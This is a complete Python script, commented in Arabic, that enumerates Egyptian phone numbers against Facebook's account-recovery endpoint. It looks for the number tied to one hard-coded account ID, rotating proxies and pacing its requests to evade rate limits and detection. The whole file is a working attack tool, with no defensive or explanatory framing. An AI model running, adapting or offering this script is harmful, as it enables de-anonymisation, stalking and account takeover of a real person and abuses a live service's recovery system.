import urllib.request
import urllib.parse
import re
import time
import os
import json
import random

# ========== الإعدادات (عدلها حسب حاجتك) ==========
TARGET_ID = "100050827416716"     # الحساب المسروق (عدّله إن لزم)
LAST_TWO = "35"                   # آخر رقمين معروفين
PREFIX = "+201"                   # مفتاح مصر
START = 0                         # بداية النطاق (0 يعني 0000000)
END = 9999                        # مؤقتاً نجرب 10,000 رقم فقط (للاختبار)
SLEEP = 2                         # ثواني بين المحاولات
# =================================================

PROXY_FILE = "proxies.txt"
TRIED_FILE = "tried.json"
RESUME_FILE = "resume.txt"
FOUND_FILE = "found.txt"

def load_tried():
    if os.path.exists(TRIED_FILE):
        with open(TRIED_FILE) as f:
            return set(json.load(f))
    return set()

def save_tried(t):
    with open(TRIED_FILE, "w") as f:
        json.dump(list(t), f)

def load_index():
    if os.path.exists(RESUME_FILE):
        with open(RESUME_FILE) as f:
            return int(f.read().strip())
    return START

def save_index(i):
    with open(RESUME_FILE, "w") as f:
        f.write(str(i))

def load_proxies():
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE) as f:
            return [line.strip() for line in f if line.strip()]
    return []

def get_lsd(proxy=None):
    headers = {"User-Agent": "Mozilla/5.0"}
    req = urllib.request.Request(
        "https://www.facebook.com/login/identify/?ctx=recover&ars=royal_blue",
        headers=headers
    )
    if proxy:
        req.set_proxy(proxy, "http")
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            html = resp.read().decode("utf-8", errors="ignore")
            match = re.search(r'name="lsd" value="([^"]+)"', html)
            return match.group(1) if match else None
    except:
        return None

def check_phone(phone, lsd, proxy=None):
    data = urllib.parse.urlencode({
        "lsd": lsd,
        "email": phone,
        "did_submit": "1",
        "from_login": "0",
        "recaptcha": "",
        "next": "",
        "rc": 0,
        "rc_npe": 0,
        "login_pkg": "{}"
    }).encode()
    headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}
    req = urllib.request.Request("https://www.facebook.com/login/identify/", data=data, headers=headers)
    if proxy:
        req.set_proxy(proxy, "http")
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            final_url = resp.geturl()
            html = resp.read().decode("utf-8", errors="ignore")
            return ("recover_code" in final_url or "confirm" in final_url) and TARGET_ID in html
    except:
        return False

def main():
    print("[*] بدء سكربت البحث...")
    proxies = load_proxies()
    tried = load_tried()
    idx = load_index()
    print(f"[*] آخر فهرس تم تجربته: {idx}")
    print(f"[*] عدد الأرقام المجربة سابقاً: {len(tried)}")
    print(f"[*] عدد البروكسيات المتاحة: {len(proxies)}")

    for i in range(idx, END + 1):
        body = str(i).zfill(7)
        phone = f"{PREFIX}{body}{LAST_TWO}"
        if phone in tried:
            continue

        proxy = random.choice(proxies) if proxies else None
        print(f"[*] نجرب: {phone} " + (f"عبر {proxy}" if proxy else "مباشر"))

        lsd = get_lsd(proxy)
        if not lsd:
            print("[-] فشل الحصول على lsd. انتظر 5 ثوانٍ...")
            time.sleep(5)
            continue

        if check_phone(phone, lsd, proxy):
            print(f"\n[+] نَجَحَ! رقم الهاتف هو: {phone}")
            with open(FOUND_FILE, "w") as f:
                f.write(phone)
            break

        tried.add(phone)
        if len(tried) % 10 == 0:
            save_tried(tried)
        save_index(i + 1)
        time.sleep(SLEEP)
    else:
        print("[-] انتهى النطاق بدون العثور على الرقم.")

if __name__ == "__main__":
    main()
